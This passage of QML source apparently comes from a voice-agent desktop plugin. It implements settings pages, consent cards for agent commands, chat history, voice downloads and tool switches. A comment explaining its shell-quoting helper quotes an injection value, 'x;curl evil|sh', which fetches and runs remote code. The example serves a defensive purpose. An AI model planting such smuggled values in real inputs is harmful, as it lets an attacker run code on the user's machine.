  readonly property bool owwLive: usingOww && owwAvailable
  // The same split for sherpa-onnx: chosen, and chosen-and-running.
  readonly property bool usingSherpa: engine === "sherpa"
  readonly property bool sherpaLive: usingSherpa && sherpaAvailable
  readonly property bool keepHistory: setting("keepHistory", true) === true

  // --- what needs fixing --------------------------------------------------------
  // One list, drawn on the Overview with a link to the page that fixes each.
  // Every entry here is something that makes a control silently not do what
  // it says; each used to be a red paragraph somewhere down the old page.
  // Files in agent or communal folders changed outside Settings, which
  // Agent details and Communal offer to keep or revert.
  // `which` is "communal" or "agents" (every agent folder).
  function changedOutside(which) {
    var n = 0
    var all = root.serviceActive ? root.vAgentFiles : folders.folders
    for (var t in all)
      if ((t === "communal") === (which === "communal"))
        n += (((all[t] || {}).changed_outside) || []).length
    return n
  }
  readonly property int agentProblems: {
    var n = 0
    for (var i = 0; i < problems.length; i++) if (problems[i].page === "agents") n++
    return n
  }
  readonly property var problems: {
    var out = []
    if (!engineInstalled)
      out.push({ text: "The voice engine is not installed yet.", page: "about" })
    if (usingOww && !owwAvailable)
      out.push({ text: "openWakeWord is chosen but not installed, so Vosk is listening instead.",
                 page: "listening" })
    if (usingSherpa && !sherpaAvailable)
      out.push({ text: "sherpa-onnx is chosen but not installed, so Vosk is listening instead.",
                 page: "listening" })
    var voice = String(setting("voice", "lessac-medium"))
    if (voiceMissing(voice))
      out.push({ text: "The voice “" + voiceName(voice) + "” is not downloaded, so another is speaking.",
                 page: "voice" })
    if (projectDir.trim() === "" && permissionLevel === "edits" && !usingEndpoint)
      out.push({ text: "“Edits are fine” has no project folder, so every change is still asked about.",
                 page: "agents", agent: "main" })
    if (usingOww && voiceAgents.length > 0)
      out.push({ text: "openWakeWord hears only its own phrase, so your other agents cannot be woken.",
                 page: "listening" })
    for (var i = 0; i < vCrew.length; i++) {
      var c = vCrew[i] || {}
      if (String(c.problem || "") !== "")
        out.push({ text: String(c.label || c.name) + ": " + String(c.problem), page: "agents", agent: String(c.id || "") })
    }
    if (setting("conversationMode", true) === true && !vRemembers && serviceActive)
      out.push({ text: (mainAgent || "This agent") + " starts fresh every turn, so follow-ups have no memory.",
                 page: "conversation" })
    if (crewProblem !== "")
      out.push({ text: crewProblem, page: "crew" })
    return out
  }

  // --- the crew map (phase M8) ----------------------------------------------------
  // What the Overview says about the two crew settings. The Crew map page
  // reads them in full (and mirrors crew_links.py); this is only the two
  // things worth a line on the Overview: a list that is not a list, and
  // agents that cannot reach each other because nobody has linked them.
  readonly property bool crewUnreadable: {
    var l = cfg["crewLinks"], q = cfg["crewQuarantine"]
    return (l !== undefined && !Array.isArray(l)) || (q !== undefined && !Array.isArray(q))
  }
  readonly property string crewProblem: {
    var l = cfg["crewLinks"]
    if (crewUnreadable)
      return "The crew links can't be read, so agents can't reach each other."
    if (voiceAgents.length > 0 && (l === undefined || l.length === 0))
      return "No crew links yet, so agents can't ask, give work to or message each other."
    return ""
  }
  // "Changed outside Settings at HH:MM" (master plan 7.4): the two lists
  // changed, and not by a write from this overlay. Trusted Codex has no
  // hook, and anything can run `omarchy bar set`, so the page says so
  // rather than showing a list as if the person had made it. Tracked here,
  // not on the page, because the overlay stays loaded and the page does not.
  property string crewOutsideAt: ""
  property var crewSeen: null
  property var crewMine: []
  function crewCanon(v) {
    if (Array.isArray(v)) return "[" + v.map(crewCanon).join(",") + "]"
    if (v && typeof v === "object")
      return "{" + Object.keys(v).sort().map(function(k) { return JSON.stringify(k) + ":" + crewCanon(v[k]) }).join(",") + "}"
    return JSON.stringify(v === undefined ? null : v)
  }
  function crewOwnWrite(links, quarantine) {
    var mine = crewMine.slice(-14)
    if (links !== null) mine.push("L" + crewCanon(links))
    if (quarantine !== null) mine.push("Q" + crewCanon(quarantine))
    crewMine = mine
  }
  function crewCheck() {
    if (!store.loaded) return
    var c = store.cfg || {}
    var now = { L: "L" + crewCanon(c.crewLinks === undefined ? [] : c.crewLinks),
                Q: "Q" + crewCanon(c.crewQuarantine === undefined ? [] : c.crewQuarantine) }
    if (crewSeen !== null)
      for (var k in now)
        if (now[k] !== crewSeen[k] && crewMine.indexOf(now[k]) < 0)
          crewOutsideAt = Qt.formatTime(new Date(), "HH:mm")
    crewSeen = now
  }
  Connections {
    target: store
    function onCfgChanged() { root.crewCheck() }
  }

  // The folders and the trash as the pages show them, read every few
  // seconds while one of those pages is on screen: with the service off
  // nobody else publishes them, and the trash list, orphan folders and
  // folder buttons read this copy even while it runs.
  Timer {
    interval: 3000
    repeat: true
    running: root.opened && root.mode === "settings"
             && ["agents", "agentdetails", "communal"].indexOf(root.page) >= 0
    onTriggered: folders.refresh()
  }

  // --- opening, and moving between pages ---------------------------------------
  function open(payloadJson) {
    mode = "settings"
    var wanted = ""
    var p = {}
    try {
      p = JSON.parse(payloadJson || "{}") || {}
      if (p.mode === "permission") mode = "permission"
      // The conversation view is the Chats page since phase M18; a summon
      // from an older bar or HUD still says "history".
      if (p.mode === "history") p.page = "chats"
      if (p.id) wanted = String(p.id)
      // A saved chat to open on the Chats page (Chats.qml).
      if (/^[0-9a-f]{16}$/.test(String(p.chat || ""))) { openChat = String(p.chat); p.page = "chats" }
    } catch (e) { p = {} }

    opened = true
    if (mode === "permission") {
      // Reset, both of them. `request` held the previous question until the
      // probe came back, and `secondsLeft` held the previous countdown --
      // so the card could open showing a stale command with a stale number
      // beside it, which is the one thing a consent prompt must not do.
      request = ({})
      secondsLeft = 0
      answered = false
      answerFor = ""
      answerVerdict = ""
      answerNote = ""
      answerFailed = false
      // Asked for by id. The hook names the request it is summoning us
      // about, and taking "the newest" instead meant that a second question
      // arriving first put the wrong command on screen above the wrong
      // Allow button.
      // One probe per summons, and only the latest one's answer is used:
      // a second card summoned while the first probe ran was otherwise
      // never looked up, and the first card was drawn above the second's
      // buttons (Codex review of M7).
      probeSeq += 1
      var probe = probeProc.createObject(root, {
        seq: probeSeq,
        command: wanted ? ["agentvoice", "pending", wanted] : ["agentvoice", "pending"]
      })
      if (probe) probe.running = true
    } else {
      // A deep link: {"page": "agents", "agent": "sarah"} opens that card.
      if (mode === "settings") goTo(String(p.page || "overview"), String(p.agent || ""),
                                    /^(prompt|tools|notes|chats|advanced|rules|skills)$/.test(String(p.tab || "")) ? String(p.tab) : "")
      showPage(mode)
    }
  }

  // Which page a Ctrl+key goes to, by index in `pages`, or -1. Eleven pages
  // since phase M18: About, the eleventh, is reached by a click and by
  // Ctrl+PgDn (and, from M28, by search).
  function pageForKey(key) {
    if (key >= Qt.Key_1 && key <= Qt.Key_9) return key - Qt.Key_1
    if (key === Qt.Key_0) return 9
    var here = 0
    for (var i = 0; i < pages.length; i++) if (pages[i].id === page) here = i
    if (key === Qt.Key_PageUp) return Math.max(0, here - 1)
    if (key === Qt.Key_PageDown) return Math.min(pages.length - 1, here + 1)
    return -1
  }

  function goTo(pageId, agent, tab) {
    var known = false
    for (var i = 0; i < pages.length; i++) if (pages[i].id === pageId) known = true
    page = known ? pageId : "overview"
    // {"page": "agentdetails", "agent": "sora"} opens that agent's details,
    // on its first tab unless "tab" names another.
    if (page === "agentdetails") {
      var validTab = /^(prompt|tools|notes|chats|advanced)$/.test(String(tab || ""))
      if (agent) { detailsAgent = agent; detailsTab = validTab ? tab : "prompt" }
      else if (validTab) detailsTab = tab
      focusAgent = ""
    } else {
      if (page === "communal" && /^(rules|who|preview|tools|skills|notes|chats)$/.test(String(tab || ""))) communalTab = tab
      focusTools = page === "agents" && tab === "tools"
      focusAgent = ""
      focusAgent = agent || ""
    }
    mode = "settings"
    Qt.callLater(function() { if (pageScroll) pageScroll.contentY = 0 })
  }

  // Into the settings, from open(). Not from a permission prompt: that card
  // is a question with a countdown, and wandering off it is not an answer.
  function showPage(m) {
    mode = m
    store.reload()
    stateFile.reload()
    historyFile.reload()
    folders.refresh()
    scanCustom.running = true
    scanVoices.running = true
    scanOww.running = true
    scanSherpa.running = true
  }

  // --- the conversation -------------------------------------------------------
  // This session's exchanges, from the file the daemon appends to as each turn
  // ends (runtime.History): tmpfs, 0600, gone at logout. Read here directly,
  // the way the state file is, rather than through the CLI.

  ListModel { id: historyModel }
  // For the chats browser (Chats.qml), which shows this session first.
  property alias historyRows: historyModel
  function clearSession() { clearHistory.running = true }
  readonly property bool saveChats: setting("saveChats", false) === true
  // The saved chat open on the Chats page, kept for the session so leaving
  // the page and coming back finds it open; set to open one from elsewhere.
  property string openChat: ""
  // The Chats page's "Saving and privacy" card, open or folded, once
  // somebody has opened or folded it; until then the page decides (open
  // while nothing is saved, so the switch that saves is in plain sight).
  property var chatsSettingsOpen: undefined
  readonly property bool chatsShown: opened && mode === "settings" && page === "chats"
  // Open saved chat `id` on the Chats page; "" opens the page as it was.
  function showChat(id) {
    if (String(id || "") !== "") {
      openChat = ""
      openChat = String(id)
    }
    goTo("chats", "")
    if (mode !== "settings" || !opened) showPage("settings")
  }

  // What has already been turned into rows. A new turn only ever appends to
  // the file, so only the lines past this are parsed and added -- rebuilding
  // the list on every turn would throw away wherever you had scrolled to.
  property string historyRaw: ""

  function historyEntry(e) {
    // One shape for every row: a ListModel takes its roles' types from the
    // first row it is given, and a later row with a field missing or of
    // another type would quietly lose it.
    return {
      at: Number(e.at) || 0,
      agent: String(e.agent || ""),
      // External id ("main" for the main agent), for the send sheet.
      agentId: String(e.agent_id || "") || "main",
      transcript: String(e.transcript || ""),
      reply: String(e.reply || ""),
      thought: String(e.thinking || ""),
      failed: String(e.error || ""),
      stopped: e.stopped === true,
      fresh: e["new"] === true,
      latency: Number(e.latency_ms) || 0
    }
  }

  function syncHistory(raw) {
    raw = String(raw || "")
    // Whole lines only: a read that lands mid-write sees the start of one,
    // and it is picked up complete on the next read.
    raw = raw.slice(0, raw.lastIndexOf("\n") + 1)
    if (raw === root.historyRaw) return
    var from = 0
    if (root.historyRaw !== "" && raw.indexOf(root.historyRaw) === 0) {
      from = root.historyRaw.length
    } else {
      // Cleared, or trimmed to its last turns: start again.
      historyModel.clear()
    }
    root.historyRaw = raw
    var lines = raw.slice(from).split("\n")
    for (var i = 0; i < lines.length; i++) {
      var line = lines[i].trim()
      if (line === "") continue
      try {
        var e = JSON.parse(line)
        if (e && typeof e === "object") historyModel.append(root.historyEntry(e))
      } catch (err) {}
    }
  }

  FileView {
    id: historyFile
    path: (Quickshell.env("XDG_RUNTIME_DIR") || "/run/user/1000") + "/agentvoice/history.jsonl"
    watchChanges: true
    printErrors: false
    onFileChanged: historyFile.reload()
    onLoaded: root.syncHistory(historyFile.text())
    // No file: nothing kept yet, or just cleared.
    onLoadFailed: root.syncHistory("")
  }

  // A file that did not exist when the watch was set never gets one -- the
  // first turn of a session creates it -- so while the page is open it is
  // read again on a timer as well. The same recovery the state file needs.
  Timer {
    interval: 1500
    running: root.chatsShown
    repeat: true
    onTriggered: historyFile.reload()
  }

  // Two presses, a few seconds apart, because it cannot be undone.
  Process {
    id: clearHistory
    command: ["agentvoice", "history", "clear"]
    onExited: historyFile.reload()
  }

  function timeOf(at) {
    return at > 0 ? Qt.formatTime(new Date(at * 1000), "h:mm AP") : ""
  }

  // Closed the moment the screen locks. This is a layer-shell surface, and
  // the HUD's own notes say those draw over the lock screen -- which with
  // this page open would put the whole session's conversation above a
  // locked machine. The Overview shows the last exchange, so it goes too.
  // A permission card goes as well, as a no (phase M7): it would show the
  // command over the lock screen, and the daemon refuses an allow while
  // locked anyway, so a click there could only be somebody else's.
  onVStateChanged: if (vState === "locked" && opened) {
    if (mode === "permission") dismiss()
    else close()
  }

  // The verdict goes on argv, which nothing but the shell can set; the
  // card's one-use nonce and digest go on stdin, never argv (/proc/PID/
  // cmdline is readable by every local account). The daemon accepts an
  // allow only from a process this shell started itself, with stdin a pipe
  // this shell holds (cards.py). One Process per answer: setting `running`
  // on one that is still sending an earlier answer does nothing, and that
  // answer would be lost.
  function answer(verdict) {
    if (!request || !request.id) { close(); return }
    if (answered) return
    answered = true
    var cid = String(request.id)
    answerFor = cid
    answerVerdict = verdict
    answerFailed = false
    answerNote = verdict === "deny" ? "" : "Sending your answer…"
    var proc = permitProc.createObject(root, {
      cardId: cid,
      command: ["agentvoice", "permit", cid, verdict],
      pending: JSON.stringify({ nonce: String(request.nonce || ""),
                                digest: String(request.digest || "") }) + "\n"
    })
    if (!proc) {
      answerFailed = true
      answerNote = "Not sent: the answer could not be started. The question times out as a no."
      return
    }
    proc.running = true
    // A no is safe whether or not it arrives -- silence is a no -- so the
    // card goes at once, as it always did.
    if (verdict === "deny") hideCard()
  }

  function permitReplied(cid, text) {
    if (cid !== answerFor) return
    var d = {}
    try { d = JSON.parse(String(text).trim() || "{}") || {} } catch (e) { d = {} }
    if (answerVerdict === "deny") {
      // Already gone from the screen; any other question still waiting comes next.
      nextCard(cid)
      return
    }
    if (d.ok === true) {
      answerNote = ""
      if (opened && mode === "permission") hideCard()
      nextCard(cid)
      return
    }
    answerFailed = true
    // "Told no" only when the daemon said so: a reply that never came may
    // be an allow whose acknowledgement was lost (Codex review of M7).
    answerNote = d.ok === false
        ? "Not allowed: " + String(d.text || "refused") + ". The agent was told no."
        : "No answer came back from Agent Voice, so whether this was allowed is not known."
  }

  function permitNeverRan(cid) {
    if (cid !== answerFor || answerVerdict === "deny") return
    answerFailed = true
    answerNote = "Not sent: the agentvoice command could not be run. The question times out as a no."
  }

  Component {
    id: permitProc
    Process {
      id: proc
      property string cardId: ""
      property string pending: ""
      property bool launched: false
      stdinEnabled: true
      onStarted: { proc.launched = true; write(proc.pending); proc.pending = "" }
      // `running` going false, not onExited: a spawn that never started
      // emits no exit, and an Allow that did nothing must say so.
      onRunningChanged: if (!running) {
        if (!proc.launched) root.permitNeverRan(proc.cardId)
        proc.destroy(2000)
      }
      stdout: StdioCollector {
        onStreamFinished: root.permitReplied(proc.cardId, String(text))
      }
    }
  }

  // The daemon holds the card and the summon names only its id; ask it for
  // the rest. This call -- started by the shell itself, its stdout a pipe
  // back to it -- is the one the daemon gives the card's nonce to (M7).
  // After an answer, the next question still waiting, if there is one: a
  // second card summoned while the first was being looked up replaced it
  // on screen, and the first was left to time out unseen (Codex review of
  // M7, pass 2). Not while locked, and only while the card just answered
  // is still the one on screen -- a newer summons already has the overlay.
  function nextCard(after) {
    if (vState === "locked" || answerFor !== after) return
    probeSeq += 1
    var probe = probeProc.createObject(root, { seq: probeSeq, after: after,
                                               command: ["agentvoice", "pending"] })
    if (probe) probe.running = true
  }

  function probeReplied(seq, text, after) {
    if (seq !== probeSeq) return
    var d = {}
    try { d = JSON.parse(String(text).trim() || "{}") || {} } catch (e) { d = {} }
    if (after !== "") {
      // A look for the next question: open it, unless the overlay has since
      // been put to another use or nothing else is waiting.
      if (d.id && d.id !== after && vState !== "locked" && answerFor === after &&
          (!opened || mode === "permission"))
        open(JSON.stringify({ mode: "permission", id: String(d.id) }))
      return
    }
    if (mode !== "permission") return
    request = d
    // The time left, not the whole timeout: a card that waited behind
    // another (nextCard) has less than it started with, and a countdown
    // promising more than remains is the thing a consent prompt must not do.
    if (request && request.timeout) {
      var waited = Number(request.asked_at) > 0
          ? Math.max(0, Date.now() / 1000 - Number(request.asked_at)) : 0
      secondsLeft = Math.max(1, Math.round(Number(request.timeout) - waited))
    }
    // Nothing is waiting under that id -- answered, expired, withdrawn: the
    // card has nothing to ask, so it goes rather than sit empty.
    if (!request || !request.id) hideCard()
  }
  Component {
    id: probeProc
    Process {
      id: probe
      property int seq: 0
      property string after: ""
      onRunningChanged: if (!running) probe.destroy(2000)
      stdout: StdioCollector {
        onStreamFinished: root.probeReplied(probe.seq, String(text), probe.after)
      }
    }
  }

  // Silence is a denial, so the countdown is the honest thing to show.
  Timer {
    interval: 1000
    // From when the card arrives, not from when the overlay opened: a
    // lookup slower than a second dismissed the empty overlay before the
    // card was there to answer (Codex review of M7).
    running: root.opened && root.mode === "permission" && !root.answered && !!root.request.id
    repeat: true
    onTriggered: {
      root.secondsLeft = Math.max(0, root.secondsLeft - 1)
      if (root.secondsLeft <= 0) root.dismiss()
    }
  }
  function close() { opened = false }
  function dismiss() {
    // Esc, or a click outside the card, is an answer: no. It used to be
    // neither -- the card went away and the agent stayed blocked until the
    // timeout, with no way to bring the question back. Silence already
    // means no in the hook, so saying so now only makes it immediate.
    if (mode === "permission" && !answered && request && request.id) {
      answer("deny")
      return
    }
    hideCard()
  }
  function hideCard() {
    if (shell && typeof shell.hide === "function")
      shell.hide((manifest && manifest.id) || "duaneoca.agentvoice")
    else close()
  }

  // Single-quote one argument for a shell. The launcher takes a command
  // line, not an argv: it does `cmd="$*"` and runs `bash -c "$cmd"`. So
  // everything handed to it is shell source, and an unquoted $HOME with a
  // space in it, or a voice name of `x;curl evil|sh`, is a command.
  function shq(s) {
    return "'" + String(s).replace(/'/g, "'\\''") + "'"
  }

  readonly property string configHome:
      Quickshell.env("XDG_CONFIG_HOME")
      || ((Quickshell.env("HOME") || "") + "/.config")
  readonly property string dataHome:
      Quickshell.env("XDG_DATA_HOME")
      || ((Quickshell.env("HOME") || "") + "/.local/share")

  // Run the installer for something chosen here that is not on the machine.
  // Choosing is the request -- a separate button to confirm it was a step
  // nobody looked for. Arguments are passed explicitly rather than read back
  // out of settings, because `omarchy bar set` has not necessarily landed by
  // the time this runs. `args` is an array, and every element is quoted.
  function fetchNow(args) {
    var cmd = shq(root.configHome
                  + "/omarchy/plugins/duaneoca.agentvoice/install.sh")
    var argv = ["--no-keybinds"].concat(args)
    for (var i = 0; i < argv.length; i++) cmd += " " + shq(argv[i])
    fetcher.command = ["omarchy-launch-floating-terminal-with-presentation", cmd]
    fetcher.running = true
    root.dismiss()
  }

  Process { id: fetcher }

  // --- the voice library ---------------------------------------------------
  // Downloads run here, in the background, through `agentvoice voice fetch`:
  // the same pinned revision and sha256 as install.sh, with progress on
  // stdout. Once there was a floating terminal for this, which closed the
  // settings to show a progress bar for one file.
  //
  // A voice name, and nothing else, reaches that argv. shell.json is written
  // by this screen, by `omarchy bar set`, by a dotfile sync and by hand, so
  // the value arriving here is not necessarily one this screen offered. It is
  // an argv element, not shell source, but checking the shape as well means a
  // junk value fails visibly rather than becoming a request.
  property var fetchQueue: []
  property string fetching: ""
  property int fetchPct: 0
  property string fetchError: ""
  function fetchVoice(v) {
    if (!/^([a-z]{2}_[A-Z]{2}-)?[a-z][a-z0-9_]*-(x_low|low|medium|high)$/.test(String(v))) return
    if (root.fetching === v || root.fetchQueue.indexOf(v) >= 0) return
    root.fetchQueue = root.fetchQueue.concat([v])
    root.nextFetch()
  }
  function nextFetch() {
    if (voiceFetcher.running || root.fetchQueue.length === 0) return
    var v = root.fetchQueue[0]
    root.fetchQueue = root.fetchQueue.slice(1)
    root.fetching = v
    root.fetchPct = 0
    root.fetchError = ""
    voiceFetcher.command = ["agentvoice", "voice", "fetch", v]
    voiceFetcher.running = true
  }
  Process {
    id: voiceFetcher
    stdout: SplitParser {
      onRead: function(line) {
        var l = String(line)
        if (l.indexOf("progress ") === 0) root.fetchPct = parseInt(l.substring(9)) || 0
        else if (l.indexOf("error ") === 0) root.fetchError = root.voiceName(root.fetching) + ": " + l.substring(6)
      }
    }
    onRunningChanged: {
      if (running) return
      scanVoices.running = true
      root.fetching = ""
      Qt.callLater(root.nextFetch)
    }
  }

  // Pick a voice, and fetch it if it is not on disk. Shared by the main
  // voice, every agent's and the library, so a voice chosen anywhere arrives.
  function chooseVoice(v) {
    if (v !== "" && root.voiceMissing(v)) root.fetchVoice(v)
  }

  // The library's "Use for": the one place outside the Agents page that sets
  // a voice. Through here rather than a second put("voice") in a page, so the
  // Agents card stays the voice's home and this is a shortcut to it.
  function assignVoice(who, v) {
    if (who === "") root.put("voice", v)
    else {
      var list = []
      for (var i = 0; i < root.voiceAgents.length; i++) {
        var copy = {}
        var a = root.voiceAgents[i] || {}
        for (var k in a) copy[k] = a[k]
        copy.id = root.agentId(a)
        if (copy.id === who) copy.voice = v
        list.push(copy)
      }
      root.put("voiceAgents", list)
    }
    root.chooseVoice(v)
  }
  // One agent's tool switch (master plan, M10): the one way any page sets
  // an agent's own tools -- the four built in (desktop, browser,
  // omarchySkill, agentvoiceSkill: "inherit" / "on" / "off") and each tool found on this
  // machine ("mcp:<server>" or "cli:<name>": "inherit" / "off" /
  // "on:<fingerprint>", the definition it approves). "inherit" leaves the key
  // out, so an entry nobody changed stays as it was. Every other field of
  // that agent, and every other agent, is copied as it was, fields this
  // build does not know included. Called from Agent details' Tools & skills
  // only (test_tool_controls.py counts the callers).
  function setAgentTool(agentId, key, value) {
    var builtin = ["desktop", "browser", "omarchySkill", "agentvoiceSkill"].indexOf(key) >= 0
    var detected = /^(mcp:[A-Za-z0-9][A-Za-z0-9._:@+-]{0,95}|cli:[a-z0-9][a-z0-9._+-]{0,31})$/.test(key)
    if (!builtin && !detected) return false
    var ok = value === "inherit" || value === "off" ||
             (builtin ? value === "on" : /^on:[0-9a-f]{32}$/.test(String(value)))
    if (!ok) return false
    function edited(current) {
      var all = {}
      if (current && typeof current === "object" && !Array.isArray(current)) {
        var keys = Object.keys(current)
        for (var k = 0; k < keys.length; k++)
          Object.defineProperty(all, keys[k], { value: current[keys[k]], enumerable: true,
                                                writable: true, configurable: true })
      }
      if (value === "inherit") delete all[key]
      else Object.defineProperty(all, key, { value: value, enumerable: true, writable: true,
                                             configurable: true })
      return all
    }
    if (agentId === "" || agentId === "main") {
      root.put("mainTools", edited(root.setting("mainTools", {})))
      return true
    }
    var list = [], found = false
    for (var i = 0; i < root.voiceAgents.length; i++) {
      var a = root.voiceAgents[i] || {}
      var copy = {}
      var names = Object.keys(a)
      for (var n = 0; n < names.length; n++)
        Object.defineProperty(copy, names[n], { value: a[names[n]], enumerable: true,
                                                writable: true, configurable: true })
      copy.id = root.agentId(a)
      if (copy.id === agentId) {
        copy.tools = edited(a.tools)
        found = true
      }
      list.push(copy)
    }
    if (!found) return false
    root.put("voiceAgents", list)
    return true
  }

  // Phase M11: switch one skill on or off for one agent, by name -- its own
  // copy, the communal one and the one its CLI finds by itself, together.
  // The one writer of mainSkillsOff and every voiceAgents[i].skillsOff
  // (FIELD_HOMES), called from Agent details' Tools & skills only. Keeps
  // every other field and agent as it is. A list that cannot be read (not
  // a list, or holding something that is no skill name) is left alone:
  // rewriting it would turn back on whatever it was trying to switch off.
  function setAgentSkill(agentId, name, on) {
    if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}(:[A-Za-z0-9][A-Za-z0-9._-]{0,63})?$/.test(String(name)))
      return false
    if (on !== true && on !== false) return false
    function edited(current) {
      if (current === undefined || current === null) current = []
      if (!Array.isArray(current) || current.length > 256) return null
      var out = []
      for (var k = 0; k < current.length; k++) {
        var n = current[k]
        if (typeof n !== "string" ||
            !/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}(:[A-Za-z0-9][A-Za-z0-9._-]{0,63})?$/.test(n))
          return null
        if (n !== name && out.indexOf(n) < 0) out.push(n)
      }
      if (!on) out.push(name)
      return out.length > 256 ? null : out
    }
    if (agentId === "" || agentId === "main") {
      var mine = edited(root.setting("mainSkillsOff", []))
      if (mine === null) return false
      root.put("mainSkillsOff", mine)
      return true
    }
    var list = [], found = false
    for (var i = 0; i < root.voiceAgents.length; i++) {
      var a = root.voiceAgents[i] || {}
      var copy = {}
      var names = Object.keys(a)
      for (var j = 0; j < names.length; j++)
        Object.defineProperty(copy, names[j], { value: a[names[j]], enumerable: true,
                                                writable: true, configurable: true })
      copy.id = root.agentId(a)
      if (copy.id === agentId) {
        var theirs = edited(a.skillsOff)
        if (theirs === null) return false
        copy.skillsOff = theirs
        found = true
      }
      list.push(copy)
    }
    if (!found) return false
    root.put("voiceAgents", list)
    return true
  }

  // Phase M17: how an extra agent is launched -- whether its conversation is
  // resumed, its hung-turn limit, its extra flags. The one writer of those
  // three voiceAgents[i] fields (FIELD_HOMES), called from Agent details'
  // Advanced only; the main agent's twins are written there directly
  // (mainResume, mainIdleTimeoutS, mainExtraArgs). Keeps every other field
  // and agent as it is. The flags are checked again by the daemon at
  // launch, whatever is saved here.
  function setAgentField(agentId, field, value) {
    if (field === "resume") {
      if (value !== true && value !== false) return false
    } else if (field === "idleTimeoutS") {
      if (typeof value !== "number" || value !== Math.round(value) || value < 30 || value > 600)
        return false
    } else if (field === "extraArgs") {
      if (!Array.isArray(value) || value.length > 16) return false
      for (var k = 0; k < value.length; k++)
        if (typeof value[k] !== "string" || value[k].length > 200) return false
    } else {
      return false
    }
    var list = [], found = false
    for (var i = 0; i < root.voiceAgents.length; i++) {
      var a = root.voiceAgents[i] || {}
      var copy = {}
      var names = Object.keys(a)
      for (var j = 0; j < names.length; j++)
        Object.defineProperty(copy, names[j], { value: a[names[j]], enumerable: true,
                                                writable: true, configurable: true })
      copy.id = root.agentId(a)
      if (copy.id === agentId) {
        if (field === "resume") copy.resume = value
        else if (field === "idleTimeoutS") copy.idleTimeoutS = value
        else copy.extraArgs = value.slice()
        found = true
      }
      list.push(copy)
    }
    if (!found) return false
    root.put("voiceAgents", list)
    return true
  }

  // Who speaks in `v` now: "main" and the display names of extra agents.
  function voiceUsers(v) {
    var out = []
    if (String(root.setting("voice", "lessac-medium")) === v) out.push("main")
    for (var i = 0; i < root.voiceAgents.length; i++) {
      var a = root.voiceAgents[i] || {}
      var own = String(a.voice || "")
      if (own === v) out.push(root.agentLabel(a))
    }
    return out
  }

  // A minute of speech in one voice, at the main agent's speed. One at a time:
  // starting another stops the first, and the same button stops it.
  property string samplePlaying: ""
  property string sampleNext: ""
  property int sampleNextPace: 0
  // The pace of the sample playing: two agents can share a voice at
  // different speeds, and each card's Test is its own (Codex review, M5).
  property int samplePace: 0
  // `speed` (optional, 50-200): an agent's own pace, from its card's ▶ Test.
  function playSample(v, speed) {
    if (!/^([a-z]{2}_[A-Z]{2}-)?[a-z][a-z0-9_]*-(x_low|low|medium|high)$/.test(String(v))) return
    var pace = Math.round(Number(speed))
    if (!(pace >= 50 && pace <= 200)) pace = Number(root.setting("voiceSpeed", 100)) || 100
    if (sampler.running) {
      root.sampleNext = root.samplePlaying === v && root.samplePace === pace ? "" : v
      root.sampleNextPace = pace
      sampler.running = false
      return
    }
    root.samplePlaying = v
    root.samplePace = pace
    sampler.command = ["agentvoice", "voice", "sample", v, String(pace)]
    sampler.running = true
  }
  function stopSample() { root.sampleNext = ""; sampler.running = false }
  Process {
    id: sampler
    onRunningChanged: {
      if (running) return
      root.samplePlaying = ""
      if (root.sampleNext !== "") {
        var v = root.sampleNext
        var pace = root.sampleNextPace
        root.sampleNext = ""
        Qt.callLater(function() { root.playSample(v, pace) })
      }
    }
  }

  // Not the default, which is the fallback for every other voice.
  function removeVoice(v) {
    if (!/^([a-z]{2}_[A-Z]{2}-)?[a-z][a-z0-9_]*-(x_low|low|medium|high)$/.test(String(v))) return
    if (v === "lessac-medium" || voiceRemover.running) return
    if (root.samplePlaying === v) root.stopSample()
    voiceRemover.command = ["agentvoice", "voice", "remove", v]
    voiceRemover.running = true
  }
  Process {
    id: voiceRemover
    onRunningChanged: if (!running) scanVoices.running = true
  }

  function trainVerifier() {
    // Switching to an engine that is not installed changes nothing a user
    // can see -- the daemon just falls back again. Send them to the
    // installer instead, which is the actual precondition.
    if (!root.owwAvailable) { root.fetchNow(["--oww"]); return }
    if (!root.usingOww) { root.put("engine", "openwakeword"); return }
    trainer.command = ["omarchy-launch-floating-terminal-with-presentation",
                       "agentvoice-train-verifier"]
    trainer.running = true
    root.dismiss()
  }
  Process { id: trainer }

  // Last on the About page, and the only red control in the overlay. Removal
  // lives inside the settings it removes because nothing runs on the way
  // out: `omarchy plugin remove` is an rm -rf with no hook, so the only
  // moment this can clean up after itself is while it exists.
  function removeEverything() {
    // One command, no shell logic. The launcher already does `cmd="$*"` and
    // re-wraps it in its own `bash -c`, and a second one here swallowed the
    // flag as $0 -- which ran this as a fresh *install* instead. The widget
    // removal is --with-widget, so the script can check afterwards that it
    // actually happened. XDG_DATA_HOME, not ~/.local/share: that is where
    // install.sh puts it.
    remover.command = ["omarchy-launch-floating-terminal-with-presentation",
                       root.shq(root.dataHome + "/agentvoice/app/install.sh") +
                       " --uninstall --with-widget"]
    remover.running = true
    root.dismiss()
  }
  Process { id: remover }

  // Custom .onnx wake models the user has trained and dropped in.
  Process {
    id: scanCustom
    command: ["bash", "-c",
      "d=\"${XDG_DATA_HOME:-$HOME/.local/share}/agentvoice/wakewords\"; " +
      "[ -d \"$d\" ] && for f in \"$d\"/*.onnx; do " +
      "[ -e \"$f\" ] && basename \"$f\" .onnx; done || true"]
    stdout: StdioCollector {
      onStreamFinished: {
        var out = []
        var lines = String(text).trim().split("\n")
        for (var i = 0; i < lines.length; i++) {
          var name = lines[i].trim()
          if (name !== "") out.push({ label: name.replace(/_/g, " ") + "  (yours)", value: name })
        }
        root.customModels = out
      }
    }
  }

  // Codex's own model list, read here as well as from the daemon: the
  // daemon publishes it only while it runs, and an agent is often set up
  // while it does not. Hidden models (review, retired) are left out, best
  // first, as Codex's own picker shows them.
  property var codexModels: []
  FileView {
    id: codexModelsFile
    path: (Quickshell.env("CODEX_HOME") || (Quickshell.env("HOME") + "/.codex")) + "/models_cache.json"
    watchChanges: true
    printErrors: false
    onFileChanged: codexModelsFile.reload()
    onLoadFailed: root.codexModels = []
    onLoaded: {
      try {
        var all = (JSON.parse(text()).models || []).filter(function(m) {
          return m && m.slug && (m.visibility || "list") === "list" })
        all.sort(function(a, b) { return (a.priority || 999) - (b.priority || 999) })
        root.codexModels = all.map(function(m) {
          var name = String(m.display_name || m.slug)
          var about = String(m.description || "").replace(/\.$/, "")
          return { value: String(m.slug), label: about ? name + " — " + about : name }
        })
      } catch (e) { root.codexModels = [] }
    }
  }

  FileView {
    id: stateFile
